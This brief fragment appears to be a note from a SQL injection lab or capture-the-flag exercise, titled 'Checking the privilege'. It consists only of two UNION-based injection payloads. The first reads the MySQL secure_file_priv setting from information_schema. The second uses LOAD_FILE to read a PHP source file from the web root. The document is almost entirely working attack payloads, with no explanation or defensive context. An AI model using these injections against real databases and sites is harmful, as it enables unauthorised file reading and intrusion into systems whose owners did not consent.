Checking the privilege

```
cn'UNION select 1,variable_name,variable_value,4 from information_schema.global_variables where variable_name="secure_file_priv"-- -
```


```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
